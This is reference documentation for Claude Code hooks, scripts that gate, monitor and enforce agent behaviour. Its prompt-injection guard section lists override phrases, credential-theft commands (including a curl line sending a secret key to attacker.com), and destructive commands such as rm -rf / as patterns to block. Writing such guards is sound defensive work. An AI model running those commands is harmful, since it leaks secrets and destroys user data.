# Hook Reference Guide

## Why hooks, not rules?

CLAUDE.md instructions are advisory — the agent reads them but may not follow them. Dogfood testing across two real codebases (14 tasks each) measured compliance by instruction type:

| Instruction type | Example | Compliance |
|---|---|---|
| Coding convention | "Use ES modules, not CommonJS" | ~90% |
| Quality gate | "Run tests before committing" | ~85% |
| Workflow behavior | "Use plan mode for multi-file changes" | ~50% |
| Process automation | "Advance through the task queue" | ~25% |

The pattern is clear: agents follow instructions about *what to produce* reliably, but instructions about *how to work* are followed roughly half the time.

Hooks solve this. They run scripts at specific points in the agent's workflow — deterministically, every time, regardless of what the instruction file says. A hook that blocks `git push` without a review will block it 100% of the time. A CLAUDE.md rule asking the agent to "always get a review before pushing" works about 85% of the time.

The enforcement spectrum:

| Mechanism | Reliability | Use for |
|---|---|---|
| Instructions (CLAUDE.md) | ~50-90% | Coding style, conventions, preferences |
| Hooks + instructions | >95% | Quality gates, safety checks, resource limits |
| Hard blocks (deny hooks) | ~100% | Security boundaries, destructive action prevention |
| Architecture (task queues, wrappers) | ~100% | Process requirements, session management |

Instructions work for *what* the agent produces; hooks and automation work for *how* the agent works.

## How hooks work

Claude Code hooks are Node.js scripts that run at five lifecycle events:

| Event | When it fires | Common use |
|---|---|---|
| **SessionStart** | Session begins | Inject context, load knowledge |
| **SessionEnd** | Session closes | Save state, commit memory |
| **PreToolUse** | Before a tool executes | Block dangerous actions, validate input |
| **PostToolUse** | After a tool completes | Run tests, check output, warn on issues |
| **PostToolUseFailure** | After a tool fails | Log errors, warn on repeated failures |
| **PreCompact** | Before `/compact` runs | Save state that would be lost |
| **PostCompact** | After auto-compaction completes | Re-inject memory and task context |
| **TaskCompleted** | Teammate agent marks task done | Quality gate before task is accepted |
| **TeammateIdle** | Teammate agent goes idle | Nudge agent to check for remaining work |
| **SubagentStart** | Subagent is spawned | Inject project context into subagent |

```mermaid
flowchart TD
    A[Session starts] -->|SessionStart| B[Inject context & knowledge]
    B --> C{Agent requests tool}
    C -->|PreToolUse| D{Hook decision}
    D -->|allow / warn| E[Tool executes]
    D -->|deny| C
    E -->|success| F[PostToolUse]
    E -->|failure| G[PostToolUseFailure]
    F --> C
    G --> C
    C -->|/compact| H[PreCompact → save state]
    H --> I[Compaction runs]
    I --> J[PostCompact → re-inject context]
    J --> C
    C -->|session ends| K[SessionEnd → save memory]
```

**Communication:** Hooks write JSON to stdout wrapped in a `hookSpecificOutput` envelope:

- **Allow** — silent `{}` (or no output). The action proceeds normally.
- **Warn (PreToolUse)** — `{"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "warn", "permissionDecisionReason": "..."}}`. Advisory message shown to the agent; action still proceeds.
- **Deny (PreToolUse)** — `{"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "deny", "permissionDecisionReason": "..."}}`. Blocks the action entirely.
- **Context (PostToolUse/SessionStart)** — `{"hookSpecificOutput": {"additionalContext": "..."}}`. Injects context into the conversation.

**Rules:**
- Always exit 0. A crashing hook is worse than a missing hook.
- Hooks are registered in `~/.claude/settings.json` with event type and tool matchers.
- All decisions are logged to `~/.claude/logs/YYYY-MM-DD.jsonl`.

---

## Hook Reference

### Session Lifecycle

#### `session-start.js` — SessionStart

Injects memory, knowledge entries, and git context at the start of every session. Detects project tools and tags from `package.json`, `Dockerfile`, etc. Scores and includes relevant knowledge entries via BM25 search. Also checks MEMORY.md and CLAUDE.md size thresholds and warns if they're too large.

- **Configuration:** Works out of the box.
- **Example trigger:** Starting any Claude Code session.
- **Example output:** `additionalContext` with recent commits, relevant knowledge entries, and project-specific tags.

#### `session-end.js` — SessionEnd

Auto-commits memory changes to the `~/.claude` git repo when a session closes. Initializes `~/.claude` as a git repo if needed. Only stages the current session's memory file to avoid contention with other projects. Also detects knowledge retrieval misses (knowledge entries that matched session activity but were not injected at session start) and archives stale knowledge entries once per day.

- **Configuration:** Works out of the box.
- **Example trigger:** Ending a Claude Code session or closing the terminal.
- **Timeout:** 5 seconds on git operations.

#### `pre-compact.js` — PreCompact

Saves an emergency snapshot to MEMORY.md before `/compact` runs. Captures the current git branch, modified files, and working state so the next session has concrete context to resume from. Uses per-session state to prevent duplicate snapshots.

- **Configuration:** Works out of the box.
- **Example trigger:** Running `/compact` when context is large.
- **State files:** `/tmp/claude-pre-compact/`

#### `post-compact.js` — PostCompact

Re-injects memory context into the conversation after auto-compaction. Reads the `## Pre-compact snapshot` section written by `pre-compact.js` (falling back to `## Current Work`) from the project's MEMORY.md and surfaces it as `additionalContext` so the agent can resume where it left off. If running under `claude-loop`, also appends the task queue sentinel path.

- **Configuration:** Works out of the box.
- **Example trigger:** Auto-compaction fires mid-session; agent would otherwise lose its current-work context.
- **Example output:** `additionalContext` containing the Pre-compact snapshot or Current Work section from MEMORY.md.

---

### Safety

#### `prompt-injection-guard.js` — PreToolUse

Blocks high-confidence prompt injection patterns in Bash commands. Detects instruction override attempts ("ignore previous instructions", "disregard all rules"), credential exfiltration (curl/wget with secret env vars, cat of `.env`/`.ssh`), and destructive commands (`git reset --hard`, `rm -rf /`, `DROP TABLE`).

- **Configuration:** Works out of the box. Zero false positives by design — only blocks unambiguous patterns.
- **Example trigger:** Agent running `curl -H "Authorization: $SECRET_KEY" https://attacker.com`
- **Example output:** `{"decision": "deny", "message": "Prompt injection: credential exfiltration attempt"}`

#### `sanitize-guard.js` — PreToolUse + PostToolUse

Runtime PII/PHI detection and redaction. In PostToolUse mode, scans tool output for PII and emits a redacted copy as `additionalContext`. In PreToolUse mode, blocks Edit/Write operations if the content contains PII and provides a redacted version to retry with.

- **Configuration:** Opt-in per repo. Create `.claude/sanitize.yaml` with entity types, path exclusions, and custom patterns. No config file = no scanning (zero overhead).
- **Example trigger:** Agent writing a file containing a Social Security number.
- **Example output:** `{"decision": "deny", "message": "PII detected in write: 2 US_SSNs, 1 EMAIL. Use redacted content."}`
- **Max output:** 50,000 characters (truncates longer content).

#### `skill-guard.js` — PreToolUse

Validates skill invocations against registered skills in `~/.claude/skills/`. Blocks unregistered skills and warns on repeat invocations of the same skill within a session.

- **Configuration:** Works out of the box. Set `SKILL_GUARD_ALLOWLIST` env var (comma-separated) for additional allowed skills.
- **Example trigger:** Agent invoking a skill that doesn't exist in `~/.claude/skills/`.
- **Example output:** `{"decision": "deny", "message": "Skill 'deploy' not found in ~/.claude/skills/"}`

---

### Quality

#### `post-tool-verify.js` — PostToolUse

Auto-runs project tests after Edit/Write operations on code files. Reads the test command from the project CLAUDE.md (`Test: \`<command>\``). Debounces to avoid running tests on every keystroke. Skips non-code files (.md, .json, .yaml, .txt, etc.).

- **Configuration:** Requires a `Test:` line in the project CLAUDE.md. Without it, this hook is inert.
- **Example trigger:** Agent editing a `.js` file in a project with tests configured.
- **Example output:** `{"decision": "warn", "message": "Tests failed (exit 1):\n  FAIL: expected 3 but got 4"}` (first 20 lines of output)
- **Thresholds:** 10-second debounce, 30-second test timeout.

#### `task-completed-gate.js` — TaskCompleted

Quality gate that runs the project's test suite before a teammate agent is allowed to mark its task complete. Only fires for teammate agents (`agent_id` must be present in hook input); main agent completions are not gated. Extracts the test command from the project CLAUDE.md and runs it with a 30-second timeout. If tests fail, returns `additionalContext` feedback blocking the completion and asking the agent to fix the failures first.

- **Configuration:** Requires a `Test:` line in the project CLAUDE.md. Without it, the gate is skipped.
- **Example trigger:** A teammate subagent signals task completion in a project that has tests configured.
- **Example output:** `additionalContext: "Tests failed. Fix before completing:\n<first 20 lines of test output>"`
- **Timeout:** 30 seconds.

#### `tool-failure-logger.js` — PostToolUseFailure

Logs tool errors to the shared JSONL log and warns the agent when the same tool fails repeatedly within a session. Skips user-initiated interrupts. Maintains a per-session failure count in `/tmp/claude-tool-failures/`; once a tool crosses the repeat threshold, injects a `additionalContext` advisory suggesting the agent try a different approach.

- **Configuration:** Works out of the box.
- **Repeat threshold:** 3 failures of the same tool name within a session.
- **Example trigger:** `Edit` failing 3 times in a row on the same file.
- **Example output:** `additionalContext: "Edit has failed 3 times this session. Consider a different approach."`
- **State files:** `/tmp/claude-tool-failures/`

#### `pr-review-guard.js` — PreToolUse

Blocks `gh pr merge` until CodeRabbit has reviewed the PR. Checks for CodeRabbit as the author of a formal review or comment. Degrades gracefully — allows merge if `gh` CLI is unavailable or the API call fails.

- **Configuration:** Works out of the box. Requires `gh` CLI and the CodeRabbit GitHub App installed on the repo.
- **Example trigger:** Agent running `gh pr merge 42`.
- **Example output:** `{"decision": "deny", "message": "CodeRabbit review not found. Do not merge without a review."}`

#### `context-guard.js` — PostToolUse

Monitors context window usage by reading the session transcript and computing actual token counts. Issues progressive warnings as context fills up.

- **Configuration:** Works out of the box.
- **Thresholds:**
  - **35%** — suggest delegating to subagents
  - **50%** — warn user, suggest `/compact`
  - **60%** — write `context-high` flag (for `/checkpoint` integration)
  - **75%** — write sentinel file (for `claude-loop` auto-restart)
- **Context window:** 200,000 tokens assumed.
- **State files:** `/tmp/claude-context-guard/`

#### `stuck-detector.js` — PreToolUse

Detects repetition loops by hashing tool name + input. Maintains a sliding window of recent actions per session. Warns when the agent repeats the same action 3 times; blocks at 5. Whitelists legitimate test/lint retry cycles (npm test, pytest, cargo test, etc.).

- **Configuration:** Works out of the box.
- **Thresholds:** Warn at 3 consecutive identical actions, block at 5.
- **Window size:** 20 actions.
- **Example output:** `{"decision": "warn", "message": "Same action repeated 3 times. Try a different approach."}`
- **State files:** `/tmp/claude-stuck-detector/`

#### `sycophancy-detector.js` — PostToolUse (no matcher — fires on all tools)

Detects sycophantic behavioral patterns by tracking tool usage sequences within a session. Three signals are monitored:

| Signal | Description | Warn | Escalate |
|---|---|---|---|
| **quick-edit** | Read → Edit same file without investigation steps in between | 3 occurrences | 5 occurrences |
| **compliance run** | Consecutive modification actions (Edit/Write/Bash) without any reads | 5 in a row | 8 in a row |
| **session ratio** | More than 80% of all actions are modifications (after 15+ total actions) | >80% | — |

On each pattern transition (new signal or threshold crossed), logs the score to the session JSONL and stages a knowledge candidate via `knowledge-capture.js` for later review.

- **Configuration:** Works out of the box.
- **Thresholds:** quick-edit warn at 3/escalate at 5; compliance run warn at 5/escalate at 8; ratio warn at >80% after 15+ actions.
- **Integration:** Logs scores to the shared JSONL log; stages knowledge candidates on pattern transitions.
- **State files:** `/tmp/claude-sycophancy-detector/` — per-session state with 4h TTL. Path persists across `claude-loop` restarts via `CLAUDE_LOOP_PID`.

---

### Resource Management

#### `teammate-idle.js` — TeammateIdle

Nudges idle teammate agents to check their task list before going idle. When a teammate agent fires a TeammateIdle event, this hook exits with code 2 and injects a `additionalContext` message instructing the agent to run `TaskList` and check for unfinished work. Main agent idle events (no `agent_id`) are ignored.

- **Configuration:** Works out of the box.
- **Example trigger:** A teammate subagent goes idle after finishing one subtask but has more items in the task queue.
- **Example output:** `additionalContext: "You went idle but may have remaining tasks. Run TaskList to check for unfinished work before going idle."`

#### `subagent-context.js` — SubagentStart

Injects helpful context into spawned subagents at the moment they start. Skips read-only agent types (Explore, Plan) since they don't write code and don't need quality gate reminders. For all other subagents, injects up to two pieces of context: a `claude-loop` warning (if `CLAUDE_LOOP_PID` is set) telling the agent to summarize partial work before hitting max turns, and the project's quality gate test command extracted from the `## Quality Gates` section of CLAUDE.md.

- **Configuration:** Works out of the box. Quality gate context requires a `Test:` line in the project CLAUDE.md.
- **Example trigger:** Parent agent spawning a coding subagent inside a `claude-loop` session.
- **Example output:** `additionalContext` with claude-loop resume instructions and/or `Quality gates: \`<test-command>\`. Run before finalizing your work.`

#### `subagent-recovery.js` — PostToolUse

Detects truncated Task subagent output and writes a recovery state file so `claude-loop` can resume the work. Fires only on `Task` tool PostToolUse events from the parent agent (skips subagent contexts). Scans the tool response for known truncation markers (max turns, context overflow) and classifies the reason. On detection, writes a JSON state file with the original prompt, partial result (up to 5,000 characters), and reason to `/tmp/claude-subagent-recovery/`, then returns an `additionalContext` advisory with actionable remediation options.

- **Configuration:** Works out of the box.
- **Truncation patterns:** Detects `max_turns`, `maximum number of turns`, `context window`, `token limit exceeded`, and similar phrases.
- **Example trigger:** A Task subagent hits its turn limit mid-task.
- **Example output:** `additionalContext: "Subagent truncated (max_turns). Original task: '...'. Partial result preserved in recovery state. Consider: (1) retry with smaller scope, (2) split into multiple subagents, or (3) increase max_turns."`
- **State files:** `/tmp/claude-subagent-recovery/{sessionKey}.json`

#### `model-router.js` — PreToolUse

Auto-selects the cheapest sufficient model for Task and Agent tool calls that don't specify a `model` parameter. Warns when allowed-tools exceeds 10 items, advising the caller to split into specialized subagents. Classifies prompts by keyword signals into three tiers:

| Tier | Cost | Signals | Examples |
|---|---|---|---|
| Haiku | 1x | search, find, read, list, grep, explore | "Search for all API endpoints" |
| Sonnet | 3x | implement, write, create, build, refactor, fix | "Write unit tests for auth" |
| Opus | 5x | architect, design, debug, plan, cross-file, root cause | "Debug the race condition" |

- **Configuration:** Works out of the box. Falls back to Sonnet when signals are ambiguous.
- **Example trigger:** Agent spawning a Task subagent without setting `model`.
- **Example output:** Silently injects `model: "haiku"` into the tool input.

#### `filesize-guard.js` — PreToolUse

Blocks reads of oversized files (>10 MB) and binary files before they waste context tokens. Covers the Read tool and Bash commands that read files (cat, head, tail, less). Allows image formats (.jpg, .png, .gif, .webp) and PDFs since Claude can process those natively.

- **Configuration:** Works out of the box.
- **Size limit:** 10 MB.
- **Blocked binary extensions:** 50+ types — video (.mp4, .mov), audio (.wav, .mp3), archives (.zip, .tar.gz), databases (.db, .sqlite), compiled (.exe, .dll, .so).
- **Example output:** `{"decision": "deny", "message": "Binary file .mp4 cannot be meaningfully read as text"}`

#### `read-once-dedup.js` — PreToolUse

Tracks Read tool calls per session and blocks re-reads of unchanged files to prevent redundant context consumption. On each Read call, records the file path and its mtime; subsequent reads of the same file are blocked if the mtime has not changed. Allows reads with different offset/limit windows (partial reads of a large file are treated as distinct). Skips subagent contexts and files under `~/.claude/` to avoid blocking memory file reads.

- **Configuration:** Works out of the box. State persists via `CLAUDE_LOOP_PID`.
- **Context savings:** 38-40% reduction in file-read context consumption in typical sessions.
- **Example trigger:** Agent re-reading a file it already has in context.
- **Example output:** `{"decision": "deny", "message": "read-once-dedup: <file> unchanged since last read. Use content already in context."}`
- **State files:** `/tmp/claude-read-once-dedup/`

#### `bloat-guard.js` — PreToolUse

Detects runaway file creation. Warns when the agent creates files matching throwaway patterns (`test-*.js`, `debug-*`, `tmp-*`, `scratch.*`) and escalates after 5+ new files per session.

- **Configuration:** Works out of the box.
- **Escalation threshold:** 5 new files per session.
- **Example trigger:** Agent creating `test-experiment-3.js`.
- **Example output:** `{"decision": "warn", "message": "New file matches throwaway pattern. Every new file must be referenced by at least one existing file."}`
- **State files:** `/tmp/claude-bloat-guard/`

#### `md-size-guard.js` — PostToolUse

Prevents silent data loss by enforcing a line limit on MEMORY.md. When MEMORY.md exceeds 150 lines after an edit, truncates in-place and writes the overflow to a dated file (`overflow-YYYY-MM-DD.md`). Also warns when CLAUDE.md approaches Claude Code's hard limits.

- **Configuration:** Works out of the box.
- **MEMORY.md limit:** 150 lines (Claude Code truncates at 200).
- **CLAUDE.md warning:** 700 lines.
- **Overflow format:** `overflow-YYYY-MM-DD.md` with collision avoidance.

---

### Knowledge

#### `knowledge-capture.js` — utility module

Stages knowledge candidates when learning opportunities are detected (e.g., a test transitions from fail to pass, a stuck loop gets resolved). Stores candidates to SQLite (Node 22.5+) or falls back to JSONL files in `~/.claude/knowledge/staged/`. Exposes `stageCandidate()`, `readStagedCandidates()`, `clearStagedCandidates()`, and `pruneStagedFiles()` for use by other hooks.

- **Used by:** `session-end.js`, `post-tool-verify.js`, `stuck-detector.js`
- **Configuration:** Works out of the box. Degrades gracefully on older Node versions.
- **Storage:** SQLite at `~/.claude/knowledge/knowledge.db` (Node 22.5+), or JSONL files in `~/.claude/knowledge/staged/` on older Node.

#### `knowledge-db.js` — utility module

Central SQLite knowledge store using `node:sqlite` (Node 22.5+). Stores knowledge entries with tags, confidence, visibility, and status. Supports full-text search via FTS5 index. Used by `session-start.js` to retrieve relevant entries. `queryRelevant()` returns `{ results, status, error? }` to distinguish empty results from access failures.

- **Used by:** `session-start.js`, `knowledge-capture.js`
- **Configuration:** Works out of the box. Database at `~/.claude/knowledge/knowledge.db`.

---

## Utility Modules

These are shared libraries, not standalone hooks:

| Module | Purpose |
|---|---|
| `log.js` | JSONL logging to `~/.claude/logs/YYYY-MM-DD.jsonl`. 90-day retention with auto-pruning. |
| `bm25.js` | BM25 full-text search. Pure Node stdlib. Used for knowledge entry scoring. |
| `pii-detector.js` | PII/PHI pattern detection and redaction. 7 built-in entity types (SSN, email, phone, credit card, IP, MRN, DOB). Supports custom patterns via `.claude/sanitize.yaml`. |
| `knowledge-capture.js` | Stages knowledge candidates for review. Exposes `stageCandidate()`, `readStagedCandidates()`, `clearStagedCandidates()`, `pruneStagedFiles()`. SQLite or JSONL fallback. |
| `knowledge-db.js` | Central knowledge store with FTS5 search. Requires Node 22.5+. |

---

## Customization

**Path-specific rules:** The playbook installs coding conventions to `~/.claude/rules/` that Claude Code applies automatically when working in matching paths:
- `hooks.md` — Hook development conventions (globs: `templates/hooks/**`)
- `testing.md` — Test conventions (globs: `tests/**`)

These supplement the global CLAUDE.md with targeted guidance for hook and test authoring without bloating the main instruction file.

**Disable a hook:** Remove its entry from `~/.claude/settings.json`, or delete the hook file from `~/.claude/hooks/`.

**Adjust thresholds:** Edit the constants at the top of each hook file. Key examples:
- `context-guard.js` — `WARN_THRESHOLD`, `BLOCK_THRESHOLD`, `FAILSAFE_THRESHOLD`
- `stuck-detector.js` — `WARN_THRESHOLD`, `BLOCK_THRESHOLD`, `WINDOW_SIZE`
- `filesize-guard.js` — `SIZE_LIMIT`
- `md-size-guard.js` — `MEMORY_LIMIT`, `CLAUDE_WARN`
- `post-tool-verify.js` — `DEBOUNCE_MS`, `TEST_TIMEOUT_MS`

**Add your own hook:** Follow the convention:
1. Write a Node.js script that reads hook input from `process.argv` or stdin.
2. Output JSON to stdout: `{}` to allow, or a `hookSpecificOutput` envelope to warn/deny/inject context (see Communication section above).
3. Always exit 0. Errors should produce `{}`, not a crash.
4. Register it in `~/.claude/settings.json` with the appropriate event type and tool matcher.

---

## Log Analysis

All hook decisions are logged to `~/.claude/logs/YYYY-MM-DD.jsonl`. See the [Log Analysis](../README.md#log-analysis) section in the README for the full list of analysis commands, including `--timeline SESSION_ID` (chronological session timeline merging hook events with transcript tool calls) and `--aggregate` (cross-session metrics: context usage, hook fire rates, session health).
